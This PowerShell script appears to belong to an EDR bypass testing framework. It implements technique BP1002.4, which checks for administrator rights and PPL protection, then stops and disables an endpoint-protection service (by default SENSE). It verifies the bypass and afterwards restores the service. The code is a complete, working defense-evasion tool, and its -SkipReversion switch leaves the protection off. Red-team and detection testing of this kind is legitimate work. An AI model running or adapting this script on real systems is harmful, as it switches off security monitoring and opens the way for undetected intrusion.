#==============================================================================
# BP1002.4 - Disable EDR User-Mode Service via PowerShell Cmdlets
# EDR Bypass Testing Automation Framework
#==============================================================================
# SYNOPSIS
#   Performs EDR bypass by stopping and disabling EDR user-mode services using
#   PowerShell cmdlets, then reverts the configuration after verification.
#
# DESCRIPTION
#   This script implements BP-1002.4 technique which uses PowerShell service
#   management cmdlets to stop and disable Windows services associated with EDR
#   solutions. The technique routes requests through the Service Control Manager
#   and cannot affect PPL (Process Protection Level) protected services.
#   
#   Test Flow:
#   1. Identify target EDR service
#   2. Backup current service configuration
#   3. Execute bypass: Stop-Service && Set-Service -StartupType Disabled
#   4. Verify service was stopped and disabled
#   5. Revert configuration: re-enable and restart service
#   6. Verify reversion was successful
#   7. Report results to orchestrator
#
# REQUIREMENTS
#   - Administrative privileges (required for service management)
#   - PowerShell 3.0 or later (service cmdlets)
#   - Target service must not be PPL protected
#
# EXIT CODES
#   0 = Success (service disabled and reverted successfully)
#   1 = General failure
#   2 = Insufficient privileges
#   3 = Service stop failed
#   4 = Service disable failed
#   5 = Service verification failed
#   6 = Service reversion failed
#   7 = Target service not found
#   8 = Service is PPL protected
#==============================================================================

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$TargetService = "SENSE",
    
    [Parameter(Mandatory=$false)]
    [string]$LogPath = "C:\EDRBypassTests\Logs",
    
    [Parameter(Mandatory=$false)]
    [switch]$SkipReversion = $false,
    
    [Parameter(Mandatory=$false)]
    [switch]$Verbose = $false,
    
    [Parameter(Mandatory=$false)]
    [int]$ServiceTimeoutSeconds = 30
)

# Set strict mode for better error handling
Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

#region Constants and Configuration
$TECHNIQUE_ID = "BP1002.4"
$TECHNIQUE_NAME = "Disable EDR User-Mode Service via PowerShell Cmdlets"
$SCRIPT_VERSION = "1.0.0"
$TIMESTAMP = Get-Date -Format "yyyyMMdd_HHmmss"
$SCRIPT_NAME = "BP1002.4-powershell"

# Result constants for orchestrator communication
$RESULT_SUCCESS = "BYPASSED"
$RESULT_FAILURE = "FAILED"
$RESULT_DETECTED = "DETECTED"
$RESULT_ERROR = "ERROR"

# Service startup type constants
$SERVICE_STARTUP_BOOT = [System.ServiceProcess.ServiceStartMode]::Boot
$SERVICE_STARTUP_SYSTEM = [System.ServiceProcess.ServiceStartMode]::System
$SERVICE_STARTUP_AUTOMATIC = [System.ServiceProcess.ServiceStartMode]::Automatic
$SERVICE_STARTUP_MANUAL = [System.ServiceProcess.ServiceStartMode]::Manual
$SERVICE_STARTUP_DISABLED = [System.ServiceProcess.ServiceStartMode]::Disabled

# Service state constants
$SERVICE_STATE_STOPPED = [System.ServiceProcess.ServiceControllerStatus]::Stopped
$SERVICE_STATE_RUNNING = [System.ServiceProcess.ServiceControllerStatus]::Running
$SERVICE_STATE_PENDING = [System.ServiceProcess.ServiceControllerStatus]::StartPending
#endregion

#region Logging Functions
function Initialize-Logging {
    param([string]$LogDirectory)
    
    try {
        if (-not (Test-Path $LogDirectory)) {
            New-Item -Path $LogDirectory -ItemType Directory -Force | Out-Null
        }
        
        $global:LogFile = Join-Path $LogDirectory "$SCRIPT_NAME`_$TIMESTAMP.log"
        $global:ResultFile = Join-Path $LogDirectory "$SCRIPT_NAME`_$TIMESTAMP`_result.json"
        
        Write-Log "=== EDR Bypass Test: $TECHNIQUE_NAME ===" -Level "INFO"
        Write-Log "Technique ID: $TECHNIQUE_ID" -Level "INFO"
        Write-Log "Script Version: $SCRIPT_VERSION" -Level "INFO"
        Write-Log "Target Service: $TargetService" -Level "INFO"
        Write-Log "Start Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -Level "INFO"
        Write-Log "Log File: $global:LogFile" -Level "INFO"
        Write-Log "Result File: $global:ResultFile" -Level "INFO"
        
        return $true
    }
    catch {
        Write-Error "Failed to initialize logging: $($_.Exception.Message)"
        return $false
    }
}

function Write-Log {
    param(
        [string]$Message,
        [ValidateSet("INFO", "WARN", "ERROR", "DEBUG")]
        [string]$Level = "INFO"
    )
    
    $logEntry = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [$Level] $Message"
    
    # Write to console
    switch ($Level) {
        "ERROR" { Write-Host $logEntry -ForegroundColor Red }
        "WARN"  { Write-Host $logEntry -ForegroundColor Yellow }
        "DEBUG" { if ($Verbose) { Write-Host $logEntry -ForegroundColor Gray } }
        default { Write-Host $logEntry }
    }
    
    # Write to file if available
    if ($global:LogFile) {
        try {
            Add-Content -Path $global:LogFile -Value $logEntry -Encoding UTF8
        }
        catch {
            Write-Warning "Failed to write to log file: $($_.Exception.Message)"
        }
    }
}
#endregion

#region Utility Functions
function Test-AdminPrivileges {
    try {
        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
        $isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        Write-Log "Administrator privileges check: $isAdmin" -Level "DEBUG"
        return $isAdmin
    }
    catch {
        Write-Log "Failed to check administrator privileges: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Test-PowerShellCmdletAvailability {
    try {
        Write-Log "Testing PowerShell service cmdlet availability..." -Level "DEBUG"
        
        $stopServiceCmd = Get-Command "Stop-Service" -ErrorAction SilentlyContinue
        $setServiceCmd = Get-Command "Set-Service" -ErrorAction SilentlyContinue
        $getServiceCmd = Get-Command "Get-Service" -ErrorAction SilentlyContinue
        $startServiceCmd = Get-Command "Start-Service" -ErrorAction SilentlyContinue
        
        if ($stopServiceCmd -and $setServiceCmd -and $getServiceCmd -and $startServiceCmd) {
            Write-Log "PowerShell service cmdlets are available and accessible" -Level "DEBUG"
            return $true
        }
        else {
            Write-Log "Required PowerShell service cmdlets are not available" -Level "ERROR"
            return $false
        }
    }
    catch {
        Write-Log "Failed to test PowerShell cmdlet availability: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Get-ServiceConfiguration {
    param([string]$ServiceName)
    
    try {
        Write-Log "Querying service configuration for: $ServiceName" -Level "DEBUG"
        
        # Use Get-Service cmdlet to retrieve service information
        $service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
        
        if (-not $service) {
            Write-Log "Service '$ServiceName' not found" -Level "ERROR"
            return $null
        }
        
        # Get additional service details using WMI
        $wmiService = Get-WmiObject -Class Win32_Service -Filter "Name='$ServiceName'" -ErrorAction SilentlyContinue
        
        $config = @{
            ServiceName = $service.Name
            DisplayName = $service.DisplayName
            Status = $service.Status
            StartType = $service.StartType
            CanStop = $service.CanStop
            CanShutdown = $service.CanShutdown
            CanPauseAndContinue = $service.CanPauseAndContinue
            ServiceType = $service.ServiceType
            ProcessId = 0
            Exists = $true
        }
        
        # Add WMI details if available
        if ($wmiService) {
            $config.ProcessId = $wmiService.ProcessId
            $config.PathName = $wmiService.PathName
            $config.ServiceAccount = $wmiService.StartName
        }
        
        Write-Log "Service config - Name: $($config.ServiceName), Display: $($config.DisplayName), Status: $($config.Status), StartType: $($config.StartType)" -Level "DEBUG"
        Write-Log "Service capabilities - CanStop: $($config.CanStop), CanShutdown: $($config.CanShutdown)" -Level "DEBUG"
        
        return $config
    }
    catch {
        Write-Log "Failed to get service configuration: $($_.Exception.Message)" -Level "ERROR"
        return $null
    }
}

function Test-ServiceExists {
    param([string]$ServiceName)
    
    try {
        $service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
        return ($service -ne $null)
    }
    catch {
        return $false
    }
}

function Test-ServicePPLProtected {
    param([string]$ServiceName)
    
    try {
        Write-Log "Checking if service is PPL protected: $ServiceName" -Level "DEBUG"
        
        $config = Get-ServiceConfiguration -ServiceName $ServiceName
        
        if (-not $config) {
            return $false
        }
        
        # Check if service can be stopped - PPL services typically cannot
        if (-not $config.CanStop) {
            Write-Log "Service cannot be stopped (CanStop=false), may indicate PPL protection" -Level "WARN"
            return $true
        }
        
        # Additional check: try to access the service process
        if ($config.ProcessId -gt 0) {
            try {
                $process = Get-Process -Id $config.ProcessId -ErrorAction SilentlyContinue
                if ($process) {
                    # Try to access process details - PPL processes are often restricted
                    $processName = $process.ProcessName
                    Write-Log "Service process accessible (PID: $($config.ProcessId), Name: $processName)" -Level "DEBUG"
                }
            }
            catch {
                Write-Log "Could not access service process (PID: $($config.ProcessId)), may indicate PPL protection" -Level "DEBUG"
                return $true
            }
        }
        
        Write-Log "Service does not appear to be PPL protected" -Level "DEBUG"
        return $false
    }
    catch {
        Write-Log "Failed to check PPL protection status: $($_.Exception.Message)" -Level "DEBUG"
        return $false
    }
}
#endregion

#region Test Result Functions
function Write-TestResult {
    param(
        [string]$Status,
        [string]$Message,
        [hashtable]$Details = @{}
    )
    
    $result = @{
        TechniqueId = $TECHNIQUE_ID
        TechniqueName = $TECHNIQUE_NAME
        Status = $Status
        Message = $Message
        Timestamp = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
        Details = $Details
        ScriptVersion = $SCRIPT_VERSION
    }
    
    try {
        $resultJson = $result | ConvertTo-Json -Depth 3
        if ($global:ResultFile) {
            Set-Content -Path $global:ResultFile -Value $resultJson -Encoding UTF8
        }
        
        Write-Log "=== TEST RESULT ===" -Level "INFO"
        Write-Log "Status: $Status" -Level "INFO"
        Write-Log "Message: $Message" -Level "INFO"
        Write-Log "Result file: $global:ResultFile" -Level "INFO"
        
        # Output for orchestrator pickup
        Write-Output "TECHNIQUE_RESULT:$Status|$Message"
        
    }
    catch {
        Write-Log "Failed to write test result: $($_.Exception.Message)" -Level "ERROR"
    }
}
#endregion

#region Main Test Functions
function Backup-OriginalState {
    param([string]$ServiceName)
    
    try {
        Write-Log "Backing up original service configuration..." -Level "INFO"
        
        $originalConfig = Get-ServiceConfiguration -ServiceName $ServiceName
        
        if (-not $originalConfig) {
            Write-Log "Failed to retrieve original service configuration" -Level "ERROR"
            return $false
        }
        
        $global:OriginalState = @{
            ServiceName = $ServiceName
            Configuration = $originalConfig
            BackupTime = Get-Date
        }
        
        Write-Log "Original service state backed up:" -Level "INFO"
        Write-Log "  Display Name: $($originalConfig.DisplayName)" -Level "INFO"
        Write-Log "  Start Type: $($originalConfig.StartType)" -Level "INFO"
        Write-Log "  Status: $($originalConfig.Status)" -Level "INFO"
        Write-Log "  Process ID: $($originalConfig.ProcessId)" -Level "INFO"
        Write-Log "  Can Stop: $($originalConfig.CanStop)" -Level "INFO"
        
        return $true
    }
    catch {
        Write-Log "Failed to backup original state: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Invoke-ServiceStop {
    param([string]$ServiceName)
    
    try {
        Write-Log "Stopping service using PowerShell cmdlet: $ServiceName" -Level "INFO"
        Write-Log "Command: Stop-Service -Name $ServiceName -Force" -Level "INFO"
        
        # Check if service is already stopped
        $service = Get-Service -Name $ServiceName -ErrorAction Stop
        if ($service.Status -eq $SERVICE_STATE_STOPPED) {
            Write-Log "Service is already stopped" -Level "WARN"
            return $true
        }
        
        # Check if service can be stopped
        if (-not $service.CanStop) {
            Write-Log "Service cannot be stopped (CanStop=false), may be PPL protected" -Level "ERROR"
            return $false
        }
        
        # Execute service stop command
        Stop-Service -Name $ServiceName -Force -ErrorAction Stop
        
        # Wait for service to stop with timeout
        $timeout = $ServiceTimeoutSeconds
        Write-Log "Waiting for service to stop (timeout: ${timeout}s)..." -Level "DEBUG"
        
        for ($i = 0; $i -lt $timeout; $i++) {
            Start-Sleep -Seconds 1
            $service = Get-Service -Name $ServiceName
            
            if ($service.Status -eq $SERVICE_STATE_STOPPED) {
                Write-Log "Service stopped successfully" -Level "INFO"
                return $true
            }
            
            if (($i + 1) % 5 -eq 0) {
                Write-Log "Still waiting for service to stop... ($($i + 1)/${timeout}s)" -Level "DEBUG"
            }
        }
        
        Write-Log "Service stop operation timed out after ${timeout} seconds" -Level "ERROR"
        return $false
    }
    catch [System.ServiceProcess.TimeoutException] {
        Write-Log "Service stop operation timed out: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
    catch [System.InvalidOperationException] {
        Write-Log "Service operation failed - may be PPL protected: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
    catch [System.ComponentModel.Win32Exception] {
        Write-Log "Access denied - service may be PPL protected: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
    catch {
        Write-Log "Failed to stop service: $($_.Exception.Message)" -Level "ERROR"
        Write-Log "Exception type: $($_.Exception.GetType().Name)" -Level "DEBUG"
        return $false
    }
}

function Invoke-ServiceDisable {
    param([string]$ServiceName)
    
    try {
        Write-Log "Disabling service using PowerShell cmdlet: $ServiceName" -Level "INFO"
        Write-Log "Command: Set-Service -Name $ServiceName -StartupType Disabled" -Level "INFO"
        
        # Execute service disable command
        Set-Service -Name $ServiceName -StartupType Disabled -ErrorAction Stop
        
        Write-Log "Service disable command executed successfully" -Level "INFO"
        return $true
    }
    catch [System.InvalidOperationException] {
        Write-Log "Service disable operation failed - may be PPL protected: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
    catch [System.ComponentModel.Win32Exception] {
        Write-Log "Access denied - service may be PPL protected: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
    catch {
        Write-Log "Failed to disable service: $($_.Exception.Message)" -Level "ERROR"
        Write-Log "Exception type: $($_.Exception.GetType().Name)" -Level "DEBUG"
        return $false
    }
}

function Test-BypassSuccess {
    param([string]$ServiceName)
    
    try {
        Write-Log "Verifying service bypass was successful..." -Level "INFO"
        
        # Small delay to ensure service changes are applied
        Start-Sleep -Seconds 2
        
        $service = Get-Service -Name $ServiceName -ErrorAction Stop
        
        # Check if service is stopped
        $isStopped = ($service.Status -eq $SERVICE_STATE_STOPPED)
        
        # Check if service is disabled
        $isDisabled = ($service.StartType -eq $SERVICE_STARTUP_DISABLED)
        
        Write-Log "Verification results:" -Level "INFO"
        Write-Log "  Service stopped: $isStopped (status: $($service.Status))" -Level "INFO"
        Write-Log "  Service disabled: $isDisabled (start type: $($service.StartType))" -Level "INFO"
        
        if ($isStopped -and $isDisabled) {
            Write-Log "Bypass verification successful - service is stopped and disabled" -Level "INFO"
            return $true
        }
        elseif ($isDisabled -and -not $isStopped) {
            Write-Log "Bypass verification partially successful - service disabled but still running" -Level "WARN"
            Write-Log "Bypass will be effective after system reboot" -Level "WARN"
            return $true
        }
        else {
            Write-Log "Bypass verification failed - service not properly disabled" -Level "ERROR"
            return $false
        }
    }
    catch {
        Write-Log "Failed to verify bypass success: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Invoke-StateReversion {
    param([string]$ServiceName)
    
    try {
        Write-Log "Reverting service to original state..." -Level "INFO"
        
        $originalConfig = $global:OriginalState.Configuration
        $originalStartType = $originalConfig.StartType
        $originalStatus = $originalConfig.Status
        
        # Re-enable service with original start type
        Write-Log "Restoring original start type: $originalStartType" -Level "INFO"
        Set-Service -Name $ServiceName -StartupType $originalStartType -ErrorAction Stop
        
        # If service was originally running, attempt to start it
        if ($originalStatus -eq $SERVICE_STATE_RUNNING) {
            Write-Log "Original service was running, attempting to restart..." -Level "INFO"
            
            # Check current service status first
            $currentService = Get-Service -Name $ServiceName
            if ($currentService.Status -eq $SERVICE_STATE_RUNNING) {
                Write-Log "Service is already running, no restart needed" -Level "INFO"
            }
            else {
                try {
                    Start-Service -Name $ServiceName -ErrorAction Stop
                    
                    # Wait for service to start
                    Write-Log "Waiting for service to start..." -Level "DEBUG"
                    Start-Sleep -Seconds 3
                    
                    $service = Get-Service -Name $ServiceName
                    if ($service.Status -eq $SERVICE_STATE_RUNNING) {
                        Write-Log "Service restarted successfully" -Level "INFO"
                    }
                    else {
                        Write-Log "Service start initiated but not yet running (status: $($service.Status))" -Level "WARN"
                    }
                }
                catch {
                    Write-Log "Failed to restart service: $($_.Exception.Message)" -Level "WARN"
                    Write-Log "Service configuration restored but service not restarted" -Level "WARN"
                    if ($global:PartialSuccess) {
                        Write-Log "Note: Service may already be running from partial success scenario" -Level "INFO"
                    }
                    return $true  # Consider partial success
                }
            }
        }
        
        Write-Log "Service state reversion completed successfully" -Level "INFO"
        return $true
    }
    catch {
        Write-Log "Failed to revert service state: $($_.Exception.Message)" -Level "ERROR"
        Write-Log "Exception type: $($_.Exception.GetType().Name)" -Level "DEBUG"
        return $false
    }
}

function Test-ReversionSuccess {
    param([string]$ServiceName)
    
    try {
        Write-Log "Verifying state reversion was successful..." -Level "INFO"
        
        # Small delay to ensure service changes are applied
        Start-Sleep -Seconds 2
        
        $service = Get-Service -Name $ServiceName -ErrorAction Stop
        $originalConfig = $global:OriginalState.Configuration
        
        # Check if start type was restored
        $startTypeRestored = ($service.StartType -eq $originalConfig.StartType)
        
        # Check if service status matches original (with some tolerance)
        $statusMatches = ($service.Status -eq $originalConfig.Status) -or
                        ($originalConfig.Status -eq $SERVICE_STATE_RUNNING -and $service.Status -eq $SERVICE_STATE_RUNNING)
        
        Write-Log "Reversion verification results:" -Level "INFO"
        Write-Log "  Start type restored: $startTypeRestored ($($service.StartType) == $($originalConfig.StartType))" -Level "INFO"
        Write-Log "  Status matches: $statusMatches ($($service.Status) vs $($originalConfig.Status))" -Level "INFO"
        
        if ($startTypeRestored) {
            if ($statusMatches) {
                Write-Log "Reversion verification fully successful" -Level "INFO"
            }
            else {
                Write-Log "Reversion verification partially successful (start type restored, status may differ)" -Level "WARN"
            }
            return $true
        }
        else {
            Write-Log "Reversion verification failed - start type not restored" -Level "ERROR"
            return $false
        }
    }
    catch {
        Write-Log "Failed to verify reversion success: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}
#endregion

#region Main Execution
function main {
    try {
        Write-Host "Starting EDR Bypass Test: $TECHNIQUE_NAME" -ForegroundColor Cyan
        
        # Initialize logging
        if (-not (Initialize-Logging -LogDirectory $LogPath)) {
            Write-Error "Failed to initialize logging system"
            exit 1
        }
        
        Write-Log "=== PRE-EXECUTION CHECKS ===" -Level "INFO"
        
        # Check administrative privileges
        if (-not (Test-AdminPrivileges)) {
            $errorMsg = "Administrative privileges required for service management operations"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
            exit 2
        }
        Write-Log "Administrative privileges confirmed" -Level "INFO"
        
        # Check PowerShell cmdlet availability
        if (-not (Test-PowerShellCmdletAvailability)) {
            $errorMsg = "Required PowerShell service cmdlets are not available"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
            exit 1
        }
        Write-Log "PowerShell service cmdlets availability confirmed" -Level "INFO"
        
        # Check if target service exists
        if (-not (Test-ServiceExists -ServiceName $TargetService)) {
            $errorMsg = "Target service '$TargetService' not found on this system"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
            exit 7
        }
        Write-Log "Target service '$TargetService' found" -Level "INFO"
        
        # Check if service is PPL protected
        $isPPLProtected = Test-ServicePPLProtected -ServiceName $TargetService
        if ($isPPLProtected) {
            $errorMsg = "Target service '$TargetService' appears to be PPL protected and cannot be managed via PowerShell cmdlets"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
            exit 8
        }
        Write-Log "Service does not appear to be PPL protected" -Level "INFO"
        
        Write-Log "=== EXECUTING BYPASS TECHNIQUE ===" -Level "INFO"
        
        # Initialize partial success tracking
        $global:PartialSuccess = $false
        
        # Backup original state
        if (-not (Backup-OriginalState -ServiceName $TargetService)) {
            $errorMsg = "Failed to backup original service state"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
            exit 1
        }
        
        # Execute service stop
        $stopSucceeded = Invoke-ServiceStop -ServiceName $TargetService
        if (-not $stopSucceeded) {
            Write-Log "Service stop failed, but continuing with disable operation..." -Level "WARN"
            Write-Log "Note: Bypass will be effective after system reboot if disable succeeds" -Level "WARN"
        }
        
        # Execute service disable
        if (-not (Invoke-ServiceDisable -ServiceName $TargetService)) {
            $errorMsg = "Failed to disable target service '$TargetService'"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_FAILURE -Message $errorMsg
            exit 4
        }
        
        # Track partial success scenario
        $global:PartialSuccess = (-not $stopSucceeded)
        
        # Verify bypass was successful
        if (-not (Test-BypassSuccess -ServiceName $TargetService)) {
            $errorMsg = "Service bypass technique failed verification"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_FAILURE -Message $errorMsg
            exit 5
        }
        
        Write-Log "=== BYPASS TECHNIQUE SUCCESSFUL ===" -Level "INFO"
        
        # Revert state unless explicitly skipped
        if (-not $SkipReversion) {
            Write-Log "=== REVERTING SERVICE STATE ===" -Level "INFO"
            
            if (-not (Invoke-StateReversion -ServiceName $TargetService)) {
                $errorMsg = "Failed to revert service state"
                Write-Log $errorMsg -Level "ERROR"
                Write-TestResult -Status $RESULT_ERROR -Message $errorMsg -Details @{
                    BypassSuccessful = $true
                    ReversionFailed = $true
                }
                exit 6
            }
            
            if (-not (Test-ReversionSuccess -ServiceName $TargetService)) {
                $errorMsg = "Service state reversion failed verification"
                Write-Log $errorMsg -Level "ERROR"
                Write-TestResult -Status $RESULT_ERROR -Message $errorMsg -Details @{
                    BypassSuccessful = $true
                    ReversionFailed = $true
                }
                exit 6
            }
            
            Write-Log "Service state successfully reverted" -Level "INFO"
        }
        else {
            Write-Log "Service state reversion skipped as requested" -Level "WARN"
        }
        
        # Report success
        if ($global:PartialSuccess) {
            $successMsg = "BP1002.4 PowerShell service bypass technique executed successfully (service disabled, effective after reboot)"
            Write-Log "=== PARTIAL SUCCESS - REBOOT REQUIRED ===" -Level "WARN"
            Write-Log "Service was disabled but could not be stopped immediately" -Level "WARN"
            Write-Log "EDR bypass will be effective after system reboot" -Level "WARN"
        }
        else {
            $successMsg = "BP1002.4 PowerShell service bypass technique executed and verified successfully"
        }
        
        Write-Log $successMsg -Level "INFO"
        Write-TestResult -Status $RESULT_SUCCESS -Message $successMsg -Details @{
            TargetService = $TargetService
            OriginalConfiguration = $global:OriginalState.Configuration
            BypassApplied = $true
            BypassVerified = $true
            StateReverted = (-not $SkipReversion)
            ServiceTimeoutSeconds = $ServiceTimeoutSeconds
            PPLProtected = $isPPLProtected
            PowerShellVersion = $PSVersionTable.PSVersion.ToString()
            PartialSuccess = $global:PartialSuccess
            ServiceStopped = (-not $global:PartialSuccess)
            RebootRequired = $global:PartialSuccess
        }
        
        Write-Log "=== TEST COMPLETED SUCCESSFULLY ===" -Level "INFO"
        Write-Log "End Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -Level "INFO"
        
        exit 0
        
    }
    catch {
        $errorMsg = "Unhandled exception in main execution: $($_.Exception.Message)"
        Write-Log $errorMsg -Level "ERROR"
        Write-Log "Stack trace: $($_.ScriptStackTrace)" -Level "ERROR"
        Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
        exit 1
    }
}

# Execute main function
main
#endregion